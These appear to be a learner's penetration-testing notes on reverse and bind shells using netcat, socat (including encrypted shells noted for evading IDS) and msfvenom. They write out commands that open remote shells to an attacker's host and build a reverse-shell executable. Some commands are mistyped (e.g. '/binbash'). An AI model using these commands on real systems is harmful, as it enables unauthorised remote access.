## what is shell

shell is what we use to interface with command line environment (cli) eg : bash or sh in linux, cmd.exe or powershell in windows.

## Type of shells

**Reverse shell**
when the target is forced to execute code that connects back to your computer. good way to bypass firewall. however you need to configure your own network to accept the shell. 

**Blind shell**
when the code executed on the target is used to start a listener attached to a shell directly on the target.


## Tools

### netcat
perform all kinds of network interactions. netcat shells are very unstable but we can improve it.

Reverse : `nc -nvlp port`
blind : `nc target_ip port`

*Stabilise shells 1*
- first use Python to spawn a better featured bash shell
`python -c 'import pty;pty.spawn("/binbash")'`

- second get access to term cmd (eg : `clear`) 
`export TERM=screen`

- third backgraound shell : `ctrl+z`

- next turn off our own terminal echo and forground the shell.
`stty raw -echo; fg`

(dont forgot `stty -a` then add rows and columns on target shell `stty rows <number>`)

*stabilise shell 2*
rlwrap is a program which gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell;

`rlwrap nc -lvnp <port>`

then use step 3 and 4 in above steps.

### socat
netcat on steroid. socat shells are stable but syntax is difficult and also `nc` is pre-installed on most of linux. this is not case with socat.

**Reverse shell**
`socat TCP-L:<port> -`

On Windows we would use this command to connect back:
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` (the pipes option force powershell or cmd.exe to use Unix style standard input and output.)

On Linux we would use this cmd to connect back :
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

**Bind shells**

Linux Target : `socat TCP-L:<PORT> EXEC:"bash -li"`
Windows Target : `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

Attacking machine : `socat TCP:<TARGET-IP>:<TARGET-PORT> -`

**encrypted shell**

with socat we can create encrypted shell both blind and reverse. its able to bypass IDS. 

syntax : replace `TCP` with `OPENSSL` in above syntax in encrypted shells.
- generate a certificate :
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

this will generate 2048 bit rsa key. 

- need to merge the two created files into a single `.pem` file.

`cat shell.key shell.crt > shell.pem`

- set up reverse shell listener
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -` 
to connect from victim machine:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

- blind shell
taget : `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
attacker : `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

*note : you have to transfer the cert file (pem)*

### Metasploit -- multi/handler
The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. 


### msfvenome
part of msf framework but shipped as separate tool. Used to generate payloads.

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

p: payload
f : format (exe,sh)

- naming convention
`<OS>/<arch>/<payload>`

The exception to this convention is Windows 32bit targets. For these, the arch is not specified, eg : `windows/shell_reverse_tcp`
For a 64bit Windows target, the arch would be specified as normal (x64).

stageless payload denoted `_` while staged payload denotes `/` between shell and reverse. eg :`shell_reverse_tcp` and `shell/reverse_tcp`

list payloas : `msfvenom --list payloads`

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


